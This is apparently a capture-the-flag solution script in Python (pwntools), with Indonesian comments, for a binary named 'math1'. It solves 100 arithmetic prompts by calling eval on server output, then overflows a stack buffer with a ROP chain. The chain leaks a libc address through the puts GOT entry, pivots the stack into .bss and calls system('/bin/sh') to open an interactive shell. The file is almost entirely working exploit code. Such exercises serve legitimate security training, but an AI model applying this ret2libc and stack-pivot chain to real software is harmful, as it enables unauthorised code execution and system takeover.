"""
File ini merupakan solusi kedua

hampir sama seperti sebelumnya, bedanya kita akan memanggil remote shell
leak libc address dengan memanggil puts GOT
hitung offset fungsi system dan selanjutnya panggil fungsi scanf ke segmen .bss,
masukkan ROP gadget untuk memanggil system("/bin/sh")
Lakukan pivoting rsp ke segmen .bss tadi dengan gadget pop rsp
"""

from pwn import *

# r = process("./math1")
# attach(r, '''
# b*0x0000000000401801
# b*__exit+33
# c
# ''')

r = remote('0.0.0.0', 17073)
# attach(pidof('math1')[0], '''
# b*0x0000000000401801
# b*__exit+33
# c
# ''')
b = ELF("./math1", checksec=False)
l = ELF("libc6_2.31-0ubuntu6_amd64.so", checksec=False)

r.recvline()
for i in range(100):
    a = r.recvuntil(" = ")[:-3]
    r.sendline(str(eval(a)))
    # print a, eval(a)

pop_rdi = 0x000000000040186b # : pop rdi ; ret
pop_rsi = 0x0000000000401869 # : pop rsi ; pop r15 ; ret
pop_r = 0x0000000000401862 # : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsp = 0x0000000000401865 # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
dat = 0x404940 # : @data
fini = 0x403da8
sub_add_rsp = 0x0000000000401874
scanfs = 0x40305b
ex = 0x4011f2
ret = 0x0000000000401016

p = 'A'*264
# puts(s);
p += p64(pop_rdi) # pop rdi
p += p64(b.got['puts'])
p += p64(b.symbols['puts'])

# Aligin stack ke 16 (0x10) bytes, agar register xmm tidak menyebabkan segmentation fault
p += p64(ret)

# scanf("%s", @data)
p += p64(pop_rsi) # pop rsi r15
p += p64(dat)
p += p64(0)
p += p64(pop_rdi) # pop rdi
p += p64(scanfs)
p += p64(b.plt['__isoc99_scanf'])

# Pivoting RSP
p += p64(pop_rsp) # pop rsp r13-15
p += p64(dat-0x18)

# leak libc
r.sendlineafter('> ', p)
leak = r.recvline()[:-1]
leak = u64(leak.ljust(8, '\0'))
print hex(leak)

l.address = leak - l.symbols["puts"]

# ROP gadget system("/bin/sh")
p = ''
p += p64(pop_rdi)
p += p64(next(l.search('/bin/sh\x00')))

p += p64(l.symbols['system'])

p += p64(pop_rdi)
p += p64(0)
p += p64(l.symbols['exit'])

r.sendline(p)

r.interactive()
